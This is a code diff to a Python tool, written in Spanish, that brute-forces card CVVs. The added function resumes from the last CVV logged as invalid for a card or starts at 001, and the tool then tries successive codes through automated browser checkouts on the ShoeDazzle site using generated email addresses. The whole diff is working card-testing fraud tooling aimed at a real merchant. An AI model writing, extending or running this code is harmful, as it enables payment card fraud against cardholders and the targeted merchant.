@@ -280,20 +280,82 @@ def iniciar_checkout(page, email):
     preparar_checkout(page)
 
 
+def obtener_cvv_inicial(numero, mes, ano):
+    """Permite al usuario elegir iniciar desde el siguiente CVV, desde 001 o ingresar uno manualmente, siempre."""
+    ultimo_cvv = None
+    if os.path.exists(CVV_INVALIDOS_FILE):
+        cvv_pattern = re.compile(rf"^{re.escape(numero)}\|{mes}\|{ano}\|(\d{{3}})$")
+        max_cvv = 0
+        with open(CVV_INVALIDOS_FILE, "r") as file:
+            for line in file:
+                match = cvv_pattern.match(line.strip())
+                if match:
+                    cvv_number = int(match.group(1))
+                    if cvv_number > max_cvv:
+                        max_cvv = cvv_number
+        if max_cvv > 0:
+            ultimo_cvv = str(max_cvv).zfill(3)
+
+    if ultimo_cvv:
+        print(Fore.YELLOW + f"Último CVV inválido encontrado para la tarjeta: {ultimo_cvv}" + Style.RESET_ALL)
+        print(Fore.CYAN + "Opciones:" + Style.RESET_ALL)
+        print(Fore.CYAN + "[S] Iniciar desde el siguiente CVV" + Style.RESET_ALL)
+        print(Fore.CYAN + "[M] Ingresar uno manualmente" + Style.RESET_ALL)
+        while True:
+            opcion = input(Fore.GREEN + "¿Desea iniciar desde el siguiente CVV (S) o ingresar uno manualmente (M)? [S/M]: " + Style.RESET_ALL).strip().lower()
+            if opcion in ('s', 'm'):
+                break
+            else:
+                print(Fore.RED + "Opción inválida. Por favor, elija 'S' o 'M'." + Style.RESET_ALL)
+        if opcion == 'm':
+            while True:
+                cvv_manual = input(Fore.GREEN + "Ingrese el CVV inicial (3 dígitos): " + Style.RESET_ALL).strip()
+                if cvv_manual.isdigit() and len(cvv_manual) == 3:
+                    return cvv_manual
+                else:
+                    print(Fore.RED + "CVV inválido. Debe ser un número de 3 dígitos." + Style.RESET_ALL)
+        siguiente = str(int(ultimo_cvv) + 1).zfill(3)
+        if int(siguiente) <= 999:
+            return siguiente
+        else:
+            print(Fore.RED + "No hay más CVVs disponibles para probar." + Style.RESET_ALL)
+            return None
+    else:
+        print(Fore.YELLOW + "No se encontraron CVVs inválidos previos para esta tarjeta." + Style.RESET_ALL)
+        print(Fore.CYAN + "Opciones:" + Style.RESET_ALL)
+        print(Fore.CYAN + "[D] Iniciar desde 001 (por defecto)" + Style.RESET_ALL)
+        print(Fore.CYAN + "[M] Ingresar uno manualmente" + Style.RESET_ALL)
+        while True:
+            opcion = input(Fore.GREEN + "¿Desea iniciar desde 001 (D) o ingresar uno manualmente (M)? [D/M]: " + Style.RESET_ALL).strip().lower()
+            if opcion in ('d', 'm'):
+                break
+            else:
+                print(Fore.RED + "Opción inválida. Por favor, elija 'D' o 'M'." + Style.RESET_ALL)
+        if opcion == 'm':
+            while True:
+                cvv_manual = input(Fore.GREEN + "Ingrese el CVV inicial (3 dígitos): " + Style.RESET_ALL).strip()
+                if cvv_manual.isdigit() and len(cvv_manual) == 3:
+                    return cvv_manual
+                else:
+                    print(Fore.RED + "CVV inválido. Debe ser un número de 3 dígitos." + Style.RESET_ALL)
+        print(Fore.YELLOW + "Iniciando desde 001." + Style.RESET_ALL)
+        return "001"
+
+
 def procesar_tarjeta(tarjeta_linea):
     """Procesa una tarjeta probando diferentes CVVs hasta encontrar uno válido o agotar los intentos."""
-    
-
     numero, mes, ano = tarjeta_linea.split("|")
     chrome_path = get_chrome_path()
-    start_cvv = get_start_cvv(numero, mes, ano)
+    # start_cvv = get_start_cvv(numero, mes, ano)
+    start_cvv = obtener_cvv_inicial(numero, mes, ano)
+    if not start_cvv:
+        print("No se puede iniciar el proceso para esta tarjeta.")
+        return
     max_intentos = 6
     cvv_actual = start_cvv
     email = generar_email()
     while cvv_actual:
-        
         check_health_shoedazzlepage()
-        
         with sync_playwright() as p:
             browser = p.chromium.launch(headless=False, executable_path=chrome_path)
             context = browser.new_context()
